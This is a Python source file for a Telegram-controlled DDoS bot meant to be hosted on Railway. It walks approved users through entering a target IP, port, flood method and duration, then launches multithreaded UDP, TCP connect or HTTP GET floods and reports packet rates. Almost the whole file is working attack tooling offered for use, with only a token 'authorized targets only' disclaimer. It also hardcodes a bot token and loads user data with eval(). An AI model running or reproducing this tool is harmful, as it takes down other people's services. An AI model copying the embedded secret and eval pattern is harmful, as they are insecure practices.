# bot.py - Railway DDoS Bot (Fully Working)
import asyncio
import threading
import time
import random
import socket
import re
import os
from datetime import datetime, timedelta
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# ============ CONFIGURATION ============
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8278228198:AAG7C97c7R50_gsykoqBMwesCuoRZTciCLA")
ADMIN_IDS = [int(os.environ.get("ADMIN_ID", 8210011971))]

BLOCKED_PORTS = {22, 25, 443, 3389, 8700, 9031, 17500, 20000, 20001}

# Attack Settings
ATTACK_THREADS = 50        # Railway safe threads
PACKET_SIZE = 1024         # 1KB packets
DELAY = 0.0001             # 0.1ms delay

# Global state
attack_running = False
attack_info = {'packets': 0, 'target': '', 'port': 0, 'method': '', 'duration': 0, 'start_time': 0}
attack_lock = threading.Lock()
user_data = {}
USERS_FILE = "users.json"

# ============ USER MANAGEMENT ============
def load_users():
    if os.path.exists(USERS_FILE):
        with open(USERS_FILE, 'r') as f:
            return eval(f.read())
    return {}

def save_users(users):
    with open(USERS_FILE, 'w') as f:
        f.write(str(users))

def is_approved(user_id):
    users = load_users()
    return users.get(str(user_id), {}).get('approved', False)

def approve_user(user_id, days):
    users = load_users()
    users[str(user_id)] = {'approved': True, 'expires': (datetime.now() + timedelta(days=days)).isoformat()}
    save_users(users)

# ============ ATTACK ENGINE ============
def send_udp_packets(ip, port):
    """Send UDP packets continuously"""
    global attack_running, attack_info
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = random._urandom(PACKET_SIZE)
    
    while attack_running:
        try:
            sock.sendto(payload, (ip, port))
            with attack_lock:
                attack_info['packets'] += 1
            time.sleep(DELAY)
        except:
            time.sleep(0.01)
    sock.close()

def send_tcp_packets(ip, port):
    """Send TCP SYN packets continuously"""
    global attack_running, attack_info
    
    while attack_running:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)
            sock.connect_ex((ip, port))
            sock.close()
            with attack_lock:
                attack_info['packets'] += 1
            time.sleep(DELAY)
        except:
            time.sleep(0.01)

def send_http_requests(ip, port):
    """Send HTTP GET requests continuously"""
    global attack_running, attack_info
    url = f"http://{ip}:{port}"
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
    
    while attack_running:
        try:
            response = requests.get(url, headers=headers, timeout=2)
            response.close()
            with attack_lock:
                attack_info['packets'] += 1
            time.sleep(0.05)
        except:
            time.sleep(0.02)

def launch_attack(ip, port, duration, method, update_callback):
    """Start attack with multiple threads"""
    global attack_running, attack_info
    
    # Reset attack info
    attack_running = True
    with attack_lock:
        attack_info = {
            'packets': 0,
            'target': f"{ip}:{port}",
            'method': method,
            'duration': duration,
            'start_time': time.time()
        }
    
    # Select attack method
    if method == 'udp':
        attack_func = send_udp_packets
    elif method == 'tcp':
        attack_func = send_tcp_packets
    else:
        attack_func = send_http_requests
    
    # Start attack threads
    threads = []
    for _ in range(ATTACK_THREADS):
        t = threading.Thread(target=attack_func, args=(ip, port), daemon=True)
        t.start()
        threads.append(t)
    
    # Monitor attack progress
    start_time = time.time()
    last_update = 0
    
    while attack_running and (time.time() - start_time) < duration:
        time.sleep(1)
        elapsed = int(time.time() - start_time)
        remaining = duration - elapsed
        
        # Update every 3 seconds
        if time.time() - last_update > 3:
            last_update = time.time()
            with attack_lock:
                pkt = attack_info['packets']
            
            # Create progress bar
            progress = int((elapsed / duration) * 20)
            bar = "█" * progress + "░" * (20 - progress)
            speed = int(pkt / elapsed) if elapsed > 0 else 0
            
            status_text = (
                f"💥 *ATTACK IN PROGRESS* 💥\n\n"
                f"🎯 Target: `{ip}:{port}`\n"
                f"⚙️ Method: `{method.upper()}`\n"
                f"📦 Packets Sent: `{pkt:,}`\n"
                f"⏱️ Time: `{elapsed}/{duration}s`\n"
                f"📊 Progress: `[{bar}]`\n"
                f"💥 Speed: `{speed:,}` pps\n"
                f"🧵 Threads: `{ATTACK_THREADS}`\n\n"
                f"🛑 Send `/stop` to halt"
            )
            try:
                update_callback(status_text)
            except:
                pass
    
    # Attack finished
    attack_running = False
    
    # Wait for threads to finish
    for t in threads:
        t.join(timeout=0.5)
    
    with attack_lock:
        pkt = attack_info['packets']
    
    completion_text = (
        f"✅ *ATTACK COMPLETED* ✅\n\n"
        f"🎯 Target: `{ip}:{port}`\n"
        f"⚙️ Method: `{method.upper()}`\n"
        f"📦 Total Packets: `{pkt:,}`\n"
        f"⏱️ Duration: `{duration}s`\n"
        f"💥 Average Speed: `{int(pkt/duration):,}` pps\n\n"
        f"_Attack finished successfully_"
    )
    try:
        update_callback(completion_text)
    except:
        pass

# ============ TELEGRAM HANDLERS ============
async def start(update, context):
    user_id = update.effective_user.id
    
    # Auto approve admin
    if user_id in ADMIN_IDS and not is_approved(user_id):
        approve_user(user_id, 365)
    
    if not is_approved(user_id):
        await update.message.reply_text("❌ *Access Denied*\nContact admin for approval.", parse_mode='Markdown')
        return
    
    user_data[user_id] = {'step': 'ip'}
    await update.message.reply_text(
        "🔥 *DDoS BOT (Railway)* 🔥\n\n"
        "📡 Send target *IP Address*:\n"
        "Example: `192.168.1.100`\n\n"
        f"⚙️ Active Threads: `{ATTACK_THREADS}`\n"
        f"📦 Packet Size: `{PACKET_SIZE}` bytes\n"
        f"⏱️ Delay: `{DELAY}` sec\n\n"
        "⚠️ *Use on authorized targets only!*",
        parse_mode='Markdown'
    )

async def handle(update, context):
    user_id = update.effective_user.id
    if not is_approved(user_id):
        await update.message.reply_text("❌ Not approved")
        return
    
    text = update.message.text.strip()
    step_data = user_data.get(user_id, {})
    step = step_data.get('step')
    
    if step == 'ip':
        # Validate IP
        if not re.match(r'^(\d{1,3}\.){3}\d{1,3}$', text):
            await update.message.reply_text("❌ Invalid IP. Send again:")
            return
        
        step_data['ip'] = text
        step_data['step'] = 'port'
        user_data[user_id] = step_data
        await update.message.reply_text(
            f"🔌 Send *Port Number*:\n"
            f"Example: `80`\n\n"
            f"🚫 Blocked Ports: {', '.join(map(str, sorted(BLOCKED_PORTS)))}",
            parse_mode='Markdown'
        )
    
    elif step == 'port':
        try:
            port = int(text)
            if port < 1 or port > 65535 or port in BLOCKED_PORTS:
                await update.message.reply_text("❌ Invalid or blocked port. Try again:")
                return
            
            step_data['port'] = port
            step_data['step'] = 'method'
            user_data[user_id] = step_data
            
            # Show method buttons
            keyboard = [
                [InlineKeyboardButton("🔥 UDP Flood", callback_data="method_udp")],
                [InlineKeyboardButton("💣 TCP SYN Flood", callback_data="method_tcp")],
                [InlineKeyboardButton("🌐 HTTP Flood", callback_data="method_http")],
                [InlineKeyboardButton("❌ Cancel", callback_data="cancel")]
            ]
            await update.message.reply_text("⚡ *Select Attack Method:*", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
        except:
            await update.message.reply_text("❌ Enter valid number:")
    
    elif step == 'duration':
        try:
            duration = int(text)
            if duration < 5 or duration > 300:
                await update.message.reply_text("❌ Duration must be 5-300 seconds")
                return
            
            ip = step_data['ip']
            port = step_data['port']
            method = step_data.get('method', 'udp')
            
            del user_data[user_id]
            
            # Confirm and start
            confirm_text = (
                f"🔥 *CONFIRM ATTACK* 🔥\n\n"
                f"🎯 Target: `{ip}:{port}`\n"
                f"⚙️ Method: `{method.upper()}`\n"
                f"⏱️ Duration: `{duration}` seconds\n"
                f"🧵 Threads: `{ATTACK_THREADS}`\n\n"
                f"⚠️ Start attack?"
            )
            keyboard = [
                [InlineKeyboardButton("✅ START NOW", callback_data=f"start_{ip}_{port}_{duration}_{method}")],
                [InlineKeyboardButton("❌ CANCEL", callback_data="cancel")]
            ]
            await update.message.reply_text(confirm_text, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(keyboard))
        except:
            await update.message.reply_text("❌ Enter duration (5-300 seconds):")
    
    else:
        await update.message.reply_text("Send /start to begin")

async def button(update, context):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    data = query.data
    
    if data == "cancel":
        if user_id in user_data:
            del user_data[user_id]
        await query.edit_message_text("❌ Cancelled")
        return
    
    if data.startswith("method_"):
        method = data.split("_")[1]
        if user_id not in user_data:
            user_data[user_id] = {}
        user_data[user_id]['method'] = method
        user_data[user_id]['step'] = 'duration'
        await query.edit_message_text(f"✅ Method: `{method.upper()}`\n\n⏱️ Send duration (5-300 seconds):", parse_mode='Markdown')
        return
    
    if data.startswith("start_"):
        parts = data.split("_")
        ip = parts[1]
        port = int(parts[2])
        duration = int(parts[3])
        method = parts[4]
        
        if user_id in user_data:
            del user_data[user_id]
        
        # Send initial message
        await query.edit_message_text(f"🚀 **Attack launching on {ip}:{port}**\n⏱️ Duration: {duration}s\n⚙️ Method: {method.upper()}\n\n_Sending packets..._", parse_mode='Markdown')
        
        # Create callback for status updates
        loop = asyncio.get_event_loop()
        def status_callback(text):
            asyncio.run_coroutine_threadsafe(query.message.reply_text(text, parse_mode='Markdown'), loop)
        
        # Launch attack in thread
        threading.Thread(target=launch_attack, args=(ip, port, duration, method, status_callback), daemon=True).start()
        return
    
    # Attack control buttons (during ongoing attack)
    global attack_running, attack_info
    if data == "stop_attack":
        attack_running = False
        await query.edit_message_text("🛑 **Attack stopped by user**", parse_mode='Markdown')
    elif data == "info_attack":
        if attack_running:
            with attack_lock:
                pkt = attack_info['packets']
            elapsed = int(time.time() - attack_info['start_time'])
            remaining = attack_info['duration'] - elapsed
            speed = int(pkt / elapsed) if elapsed > 0 else 0
            await query.edit_message_text(
                f"ℹ️ **Attack Info**\n\n"
                f"🎯 Target: `{attack_info['target']}`\n"
                f"📦 Packets: `{pkt:,}`\n"
                f"⏱️ Remaining: `{remaining}s`\n"
                f"💥 Speed: `{speed:,}` pps",
                parse_mode='Markdown'
            )
        else:
            await query.edit_message_text("ℹ️ No active attack")
    elif data == "refresh_attack":
        if attack_running:
            with attack_lock:
                pkt = attack_info['packets']
            elapsed = int(time.time() - attack_info['start_time'])
            remaining = attack_info['duration'] - elapsed
            progress = int((elapsed / attack_info['duration']) * 20)
            bar = "█" * progress + "░" * (20 - progress)
            speed = int(pkt / elapsed) if elapsed > 0 else 0
            text = (
                f"💥 **ATTACK ACTIVE** 💥\n\n"
                f"🎯 `{attack_info['target']}`\n"
                f"📦 `{pkt:,}` packets\n"
                f"⏱️ `{elapsed}/{attack_info['duration']}s`\n"
                f"📊 `[{bar}]`\n"
                f"💥 `{speed:,}` pps\n\n"
                f"*Send /stop to halt*"
            )
            await query.edit_message_text(text, parse_mode='Markdown')
        else:
            await query.edit_message_text("✅ No active attack")

async def stop(update, context):
    global attack_running
    attack_running = False
    await update.message.reply_text("🛑 Attack stopped")

async def power(update, context):
    global ATTACK_THREADS
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ Unauthorized")
        return
    if context.args:
        try:
            threads = int(context.args[0])
            if 10 <= threads <= 100:
                ATTACK_THREADS = threads
                await update.message.reply_text(f"✅ Threads set to {threads}")
            else:
                await update.message.reply_text("Use 10-100")
        except:
            await update.message.reply_text("Invalid number")
    else:
        await update.message.reply_text(f"Current threads: {ATTACK_THREADS}\nUse /power <10-100>")

async def myinfo(update, context):
    user_id = update.effective_user.id
    status = "✅ Approved" if is_approved(user_id) else "❌ Not approved"
    await update.message.reply_text(f"📋 *Your Account*\n\n🆔 ID: `{user_id}`\n📊 Status: {status}", parse_mode='Markdown')

async def blocked_ports(update, context):
    await update.message.reply_text(f"🚫 *Blocked Ports*\n\n{', '.join(map(str, sorted(BLOCKED_PORTS)))}", parse_mode='Markdown')

async def help(update, context):
    await update.message.reply_text(
        "🤖 *DDoS Bot Commands*\n\n"
        "/start - Begin attack setup\n"
        "/stop - Stop current attack\n"
        "/power <10-100> - Set thread count\n"
        "/myinfo - Account info\n"
        "/blockedports - Show blocked ports\n"
        "/help - This menu\n\n"
        "*Attack Flow*\n"
        "1. Enter IP\n"
        "2. Enter port\n"
        "3. Select method\n"
        "4. Enter duration\n"
        "5. Confirm → Attack starts\n\n"
        "⚠️ *Use responsibly!*",
        parse_mode='Markdown'
    )

async def error(update, context):
    print(f"Error: {context.error}")

# ============ MAIN ============
def main():
    print("=" * 50)
    print("🔥 DDoS Bot Deploying on Railway...")
    print(f"👑 Admins: {ADMIN_IDS}")
    print(f"🧵 Default threads: {ATTACK_THREADS}")
    print("=" * 50)
    
    app = Application.builder().token(BOT_TOKEN).build()
    
    # Command handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stop", stop))
    app.add_handler(CommandHandler("power", power))
    app.add_handler(CommandHandler("myinfo", myinfo))
    app.add_handler(CommandHandler("blockedports", blocked_ports))
    app.add_handler(CommandHandler("help", help))
    
    # Callback and message handlers
    app.add_handler(CallbackQueryHandler(button))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle))
    app.add_error_handler(error)
    
    print("✅ Bot is LIVE! Send /start on Telegram")
    print("=" * 50)
    
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
